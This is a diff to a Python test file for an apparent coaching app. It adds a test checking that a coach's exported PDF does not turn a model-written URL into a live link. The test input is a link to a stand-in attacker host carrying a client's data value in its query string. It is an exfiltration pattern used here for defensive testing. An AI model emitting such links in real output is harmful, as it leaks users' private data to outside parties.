@@ -245,3 +245,21 @@ def test_a_normal_coach_answer_keeps_names_citations_bold_and_dollars(monkeypatc
     assert r"\[S1, S3\]" in shown and r"\[S1\]\[S2\]" in shown
     assert "**" in shown and r"\$5" in shown
     assert r"helps! \[S3\]" in shown
+
+
+def test_a_coachs_session_pdf_draws_no_link_from_an_answer(monkeypatch):
+    """The page builds a coach's PDF with links broken: the wiring, not only the PDF code."""
+    from tests.fakes import pdf_text
+    from tests.test_app_export import _recorded_builds
+
+    at, _ = _coach(monkeypatch)
+    built = _recorded_builds(monkeypatch)
+    answer = "client-1 logged no day; see https://attacker.example/r?w=87.3"
+    model = ScriptedChatModel(
+        replies=[tool_reply((LIST_TOOL, {})), AIMessage(answer)], search_first=False
+    )
+    _use_model(monkeypatch, model)
+    at = _ask(at, "Who logged least?")
+    assert built, "the page drew no download button"
+    drawn = pdf_text(built[-1]())
+    assert "attacker" in drawn and "https://attacker" not in drawn
